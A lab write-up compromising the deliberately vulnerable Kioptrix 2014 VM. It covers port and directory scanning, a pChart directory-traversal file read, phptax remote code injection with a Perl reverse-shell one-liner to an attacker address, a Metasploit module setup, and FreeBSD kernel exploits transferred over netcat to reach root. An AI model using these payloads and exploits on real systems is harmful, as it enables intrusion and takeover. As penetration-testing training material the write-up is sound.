## Machine Info

- **Name**: Kioptrix: 2014 (#5)
- **Date release**: 6 Apr 2014
- **Author**: [Kioptrix](https://www.vulnhub.com/author/kioptrix,8/)
- **Series**: [Kioptrix](https://www.vulnhub.com/series/kioptrix,8/)
- **Web page**: http://www.kioptrix.com/blog/a-new-vm-after-almost-2-years/
- **VulnHub**: [Kioptrix: 2014 (#5) ~ VulnHub](https://www.vulnhub.com/entry/kioptrix-2014-5,62/)

## PWK

### recon

- FreeBSD 9.0
- Apache 2.2.21
- PHP
- OpenSSL
- user: www, root

#### nmap

```
PORT     STATE  SERVICE VERSION
22/tcp   closed ssh
80/tcp   open   http    Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)
|_http-title: Site doesn't have a title (text/html).
8080/tcp open   http    Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)
MAC Address: 00:0C:29:CC:71:59 (VMware)
Aggressive OS guesses: FreeBSD 7.0-RELEASE - 9.0-RELEASE (93%), Juniper MAG2600 SSL VPN gateway (IVE OS 7.3) (92%), Linksys WAP54G WAP (92%), ISS Proventia GX3002C firewall (Linux 2.4.18) (92%), Linux 2.6.20 (92%), Linux 2.6.18 (91%), Linux 2.6.23 (91%), Linux 2.6.24 (91%), FreeBSD 7.0-RC1 (91%), FreeBSD 7.0-STABLE (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.96 seconds
```

#### path

- 80 port, `$ dirb http://$IP`

```
-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Fri Nov 17 05:36:11 2023
URL_BASE: http://192.168.123.127/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://192.168.123.127/ ----
+ http://192.168.123.127/cgi-bin/ (CODE:403|SIZE:210)
+ http://192.168.123.127/index.html (CODE:200|SIZE:152)

-----------------
END_TIME: Fri Nov 17 05:36:36 2023
DOWNLOADED: 4612 - FOUND: 2
```

- check html source code, find another url path: `pChart2.1.3/index.php`

```html
<html>
 <head>
  <!--
  <META HTTP-EQUIV="refresh" CONTENT="5;URL=pChart2.1.3/index.php">
  -->
 </head>

 <body>
  <h1>It works!</h1>
 </body>
</html>
```

- web

```
$ whatweb http://192.168.123.127/pChart2.1.3/examples/index.php
http://192.168.123.127/pChart2.1.3/examples/index.php [200 OK] Apache[2.2.21][mod_ssl/2.2.21], Country[RESERVED][ZZ], HTTPServer[FreeBSD][Apache/2.2.21 (FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8], IP[192.168.123.127], OpenSSL[0.9.8q], PHP[5.3.8], Script, Title[pChart 2.x - examples rendering], WebDAV[2], X-Powered-By[PHP/5.3.8]
```

- 8080 port, `$ gobuster dir -u http://192.168.123.127:8080/phptax -a "Mozilla/4.0 Mozilla4_browser" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x json,html,php,txt,xml,md -q`

```
/.html                (Status: 403) [Size: 214]
/index.php            (Status: 200) [Size: 11974]
/files                (Status: 301) [Size: 249] [--> http://192.168.123.127:8080/phptax/files/]
/data                 (Status: 301) [Size: 248] [--> http://192.168.123.127:8080/phptax/data/]
/pictures             (Status: 301) [Size: 252] [--> http://192.168.123.127:8080/phptax/pictures/]
/maps                 (Status: 301) [Size: 248] [--> http://192.168.123.127:8080/phptax/maps/]
/readme               (Status: 301) [Size: 250] [--> http://192.168.123.127:8080/phptax/readme/]
```

### exploit

#### pChart - direcotry traversal

- pChart **2.1.3**
- `$ searchsploit pChart`

```
$ searchsploit pChart
pChart 2.1.3 - Multiple Vulnerabilities                                                                                              | php/webapps/31173.txt
[1] Directory Traversal:
hxxp://localhost/examples/index.php?Action=View&Script=%2f..%2f..%2fetc/passwd
The traversal is executed with the web server's privilege and leads to
sensitive file disclosure (passwd, siteconf.inc.php or similar),
access to source codes, hardcoded passwords or other high impact
consequences, depending on the web server's configuration.
This problem may exists in the production code if the example code was
copied into the production environment.
```

- sensitive data leakage
  - `http://192.168.123.127/pChart2.1.3/examples/index.php?Action=View&Script=/etc/passwd`
  - Apache config: `http://192.168.123.127/pChart2.1.3/examples/index.php?Action=View&Script=/usr/local/etc/apache22/httpd.conf`

```
SetEnvIf User-Agent ^Mozilla/4.0 Mozilla4_browser

<VirtualHost *:8080>
    DocumentRoot /usr/local/www/apache22/data2
```

- set User-Agent, $IP:8080 -> will not be forbidden

#### phptax - remote code injection

- seek exp methods

```
$ searchsploit phptax [x]
PhpTax - 'pfilez' Execution Remote Code Injection (Metasploit)                                                                       | php/webapps/21833.rb
PhpTax 0.8 - File Manipulation 'newvalue' / Remote Code Execution                                                                    | php/webapps/25849.txt
phptax 0.8 - Remote Code Execution                                                                                                   | php/webapps/21665.txt

```

- GET request

```
GET / HTTP/1.1
Host: 192.168.123.127:8080
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/4.0 Mozilla4_browser
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: close
```

![image-20231117095255625](./KIOPTRIX%202014%20(5).assets/image-20231117095255625.png)

##### (1) 211665

- poc

```
After /index.php?pfilez=1040d1-pg2.tob;id>/tmp/qwe;&pdf=make
$ curl 'http://192.168.123.127/pChart2.1.3/examples/index.php?Action=View&Script=/tmp/qwe'
<code><span style="color: #000000">
uid=80(www)&nbsp;gid=80(www)&nbsp;groups=80(www)<br /></span>
</code>
```

- validate machine's env
  - python [x]
  - /bin/sh [y]
  - /usr/bin/nc [y]
  - perl [y]

![image-20231117095451323](./KIOPTRIX%202014%20(5).assets/image-20231117095451323.png)

![image-20231117095457957](./KIOPTRIX%202014%20(5).assets/image-20231117095457957.png)

- inject perl code: `perl -e 'use Socket;$i="192.168.123.15";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'`
- on host, `sudo nc -lvnp 1234`

##### (2) 21833 - metasploit

```
msf6 exploit(multi/http/phptax_exec) > options

Module options (exploit/multi/http/phptax_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     192.168.123.127  yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      8080             yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /phptax/         yes       The path to the web application
   VHOST                       no        HTTP server virtual host


Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.123.15   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   PhpTax 0.8



View the full module info with the info, or info -d command.

msf6 exploit(multi/http/phptax_exec) > run
```

### priv-esca

after getting a user priv shell (www), enum:

- sudo -l [x]
- suid, guid [x]
- crontab [x]
- passwd, shadow [x]
- freebsd kernel priv esca

```bash
$ searchsploit freebsd 9.0
FreeBSD 9.0 - Intel SYSRET Kernel Privilege Escalation            | freebsd/local/28718.c
FreeBSD 9.0 < 9.1 - 'mmap/ptrace' Local Privilege Escalation      | freebsd/local/26368.c

# on host
nc -lvnp 1234 < 26368.c
# on remote
nc 192.168.123.15 1234 > 26368.c
gcc 26368.c
./a.out
```
